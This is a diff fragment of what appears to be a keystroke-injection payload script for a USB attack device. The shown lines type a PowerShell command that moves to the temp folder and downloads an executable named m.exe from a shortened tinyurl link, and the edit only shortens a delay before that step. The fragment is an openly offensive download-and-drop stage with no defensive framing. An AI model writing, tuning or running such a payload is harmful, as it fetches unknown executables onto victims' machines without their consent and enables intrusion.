@@ -31,7 +31,7 @@ ENTER
 DELAY 1500
 STRING cd $env:TEMP
 ENTER
-DELAY 15000
+DELAY 200
 STRING Invoke-WebRequest 'https://tinyurl.com/495ka9j5' -OutFile m.exe
 ENTER
 DELAY 15000
